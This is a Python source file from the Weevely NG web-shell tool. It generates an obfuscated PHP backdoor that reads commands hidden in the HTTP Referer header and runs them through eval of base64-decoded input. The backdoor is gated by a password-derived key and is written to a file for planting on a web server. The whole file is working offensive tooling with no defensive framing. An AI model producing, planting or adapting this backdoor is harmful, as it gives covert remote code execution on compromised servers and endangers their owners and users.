# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import base64

class Backdoor:
	payload_template = """
parse_str($_SERVER['HTTP_REFERER'],$a); 
if(reset($a)=='%%%START_KEY%%%' && count($a)==9) { 
echo '<%%%END_KEY%%%>';
eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
echo '</%%%END_KEY%%%>';
}
"""

	backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"

	def __init__( self, password ):
		self.password  = password
		self.start_key = self.password[:2]
		self.end_key   = self.password[2:]
		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
		self.backdoor  = self.backdoor_template.replace( '%%%PAYLOAD%%%', base64.b64encode(self.payload) )

	def __str__( self ):
		return self.backdoor

	def save( self, filename ):
		out = file( filename, 'wt' )
   		out.write( self.backdoor )
		out.close()

		print "+ Backdoor file '%s' created with password '%s'." % ( filename, self.password )
